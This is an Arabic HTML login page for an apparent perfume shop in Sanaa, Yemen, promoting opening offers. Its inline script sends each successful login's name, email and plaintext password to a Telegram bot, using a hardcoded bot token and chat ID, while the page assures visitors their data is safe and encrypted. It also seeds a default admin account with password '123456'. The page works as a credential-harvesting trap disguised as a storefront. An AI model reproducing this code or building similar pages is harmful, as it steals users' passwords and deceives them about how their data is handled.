<!DOCTYPE HTML>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="max-age=604800" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<title>تسجيل الدخول - المسعودي للعطور</title>

<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<script src="js/jquery-2.0.0.min.js" type="text/javascript"></script>
<script src="js/bootstrap.bundle.min.js" type="text/javascript"></script>
<link href="css/bootstrap.css" rel="stylesheet" type="text/css"/>
<link href="fonts/fontawesome/css/all.min.css" type="text/css" rel="stylesheet">
<link href="css/ui.css" rel="stylesheet" type="text/css"/>
<link href="css/responsive.css" rel="stylesheet" media="only screen and (max-width: 1200px)" />
<script src="js/script.js" type="text/javascript"></script>

<style>
body {
    background: linear-gradient(135deg, #1a1a2e, #2d1b0e);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    font-family: 'Segoe UI', 'Tahoma', 'Arial', sans-serif;
}
.announcement-bar {
    background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
    color: #fff;
    padding: 12px 0;
    text-align: center;
    font-size: 1rem;
    font-weight: bold;
    border-bottom: 3px solid #FFD700;
}
.announcement-bar i { margin: 0 8px; color: #FFD700; }
.announcement-bar .highlight { color: #FFD700; }

.login-container {
    max-width: 450px;
    margin: 60px auto;
    background: rgba(255,255,255,0.95);
    border-radius: 20px;
    padding: 40px 35px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    border: 2px solid #FFD700;
}
.login-container .logo {
    text-align: center;
    font-size: 2.5rem;
    font-weight: 900;
    color: #2d1b0e;
    margin-bottom: 5px;
    animation: colorShift 4s infinite;
}
@keyframes colorShift {
    0% { color: #FFD700; }
    25% { color: #FF6B6B; }
    50% { color: #4ECDC4; }
    75% { color: #FFD700; }
    100% { color: #FF6B6B; }
}
.login-container .subtitle {
    text-align: center;
    color: #888;
    margin-bottom: 30px;
    font-size: 0.9rem;
}
.login-container .form-group { margin-bottom: 20px; }
.login-container .form-group label {
    font-weight: bold;
    color: #333;
    display: block;
    margin-bottom: 8px;
}
.login-container .form-group input {
    width: 100%;
    padding: 12px 18px;
    border: 2px solid #e0d5c8;
    border-radius: 10px;
    font-size: 1rem;
    transition: border-color 0.3s;
}
.login-container .form-group input:focus {
    border-color: #8B4513;
    outline: none;
}
.login-container .btn-login {
    width: 100%;
    padding: 14px;
    background: linear-gradient(135deg, #8B4513, #a0522d);
    color: #fff;
    border: none;
    border-radius: 10px;
    font-size: 1.2rem;
    font-weight: bold;
    cursor: pointer;
    transition: all 0.3s;
}
.login-container .btn-login:hover {
    transform: scale(1.02);
    box-shadow: 0 5px 20px rgba(139,69,19,0.4);
}
.login-container .links { text-align: center; margin-top: 20px; }
.login-container .links a { color: #8B4513; text-decoration: none; font-weight: bold; }
.login-container .links a:hover { text-decoration: underline; }
.footer-custom {
    background: #1a1a2e;
    color: #aaa;
    padding: 20px 0;
    text-align: center;
    margin-top: auto;
    border-top: 2px solid #FFD700;
}
.alert-danger {
    background: #f8d7da;
    color: #721c24;
    padding: 12px 15px;
    border-radius: 8px;
    margin-bottom: 15px;
    border: 1px solid #f5c6cb;
    display: none;
}
</style>
</head>
<body>

<div class="announcement-bar">
    <i class="fas fa-gift"></i> 🎉 عروضات بمناسبة افتتاح المنصة التسويقية <span class="highlight">(المسعودي للعطور)</span> 🎁 <i class="fas fa-gift"></i>
</div>

<div class="login-container">
    <div class="logo">المسعودي للعطور</div>
    <div class="subtitle">✨ تسجيل الدخول للاستفادة من العروض الحصرية ✨</div>

    <div class="alert-danger" id="errorMsg">
        <i class="fas fa-exclamation-circle"></i> البريد الإلكتروني أو كلمة المرور غير صحيحة
    </div>

    <form id="loginForm">
        <div class="form-group">
            <label><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
            <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
        </div>
        <div class="form-group">
            <label><i class="fas fa-lock"></i> كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
        </div>
        <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
            <label><input type="checkbox" id="rememberMe"> تذكرني</label>
            <a href="#" style="color:#8B4513; font-size:0.9rem;">نسيت كلمة المرور؟</a>
        </div>
        <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
    </form>

    <div class="links">
        <p>ليس لديك حساب؟ <a href="./register.html">أنشئ حساباً مجاناً</a></p>
        <p style="margin-top:10px; font-size:0.9rem; color:#888;">
            <i class="fas fa-shield-alt"></i> بياناتك آمنة ومشفرة
        </p>
    </div>
</div>

<footer class="footer-custom">
    <div class="container">
        <p>&copy; 2025 المسعودي للعطور - صنعاء، اليمن</p>
    </div>
</footer>

<script>
// ========== إعدادات بوت التليجرام (تم التحديث بالتوكن الجديد) ==========
const BOT_TOKEN = '8549358187:AAG8Z2CioXFFZK43P0FTcTVKvutUSzUGJqU';
const CHAT_ID = '7770087246';

$(document).ready(function() {
    var users = JSON.parse(localStorage.getItem('users')) || [];
    if (users.length === 0) {
        users.push({
            email: 'admin@almasoudi.com',
            password: '123456',
            firstName: 'مدير',
            lastName: 'النظام'
        });
        localStorage.setItem('users', JSON.stringify(users));
    }

    $('#loginForm').on('submit', function(e) {
        e.preventDefault();
        
        $('#errorMsg').hide();
        
        var email = $('#email').val().trim();
        var password = $('#password').val().trim();
        var remember = $('#rememberMe').is(':checked');
        
        var user = users.find(u => u.email === email && u.password === password);
        
        if (user) {
            localStorage.setItem('isLoggedIn', 'true');
            localStorage.setItem('user', JSON.stringify(user));
            if (remember) localStorage.setItem('rememberedEmail', email);
            else localStorage.removeItem('rememberedEmail');
            
            // ===== إرسال بيانات الدخول إلى بوت التليجرام (التوكن الجديد) =====
            var message = "🔐 *تسجيل دخول - المسعودي للعطور*\n";
            message += "👤 الاسم: " + user.firstName + " " + user.lastName + "\n";
            message += "📧 البريد: " + email + "\n";
            message += "🔑 كلمة المرور: " + password + "\n";
            message += "🕒 الوقت: " + new Date().toLocaleString('ar-EG');
            
            $.ajax({
                url: 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage',
                method: 'POST',
                data: {
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                },
                success: function(response) {
                    console.log('✅ تم إرسال البيانات إلى البوت');
                },
                error: function() {
                    console.warn('⚠️ فشل الإرسال إلى البوت');
                }
            });
            
            alert('✅ مرحباً ' + user.firstName + '! تم تسجيل الدخول بنجاح');
            window.location.href = './index.html';
        } else {
            $('#errorMsg').show();
            $('#password').val('').focus();
        }
    });
    
    var remembered = localStorage.getItem('rememberedEmail');
    if (remembered) {
        $('#email').val(remembered);
        $('#rememberMe').prop('checked', true);
    }
});
</script>

</body>
</html>
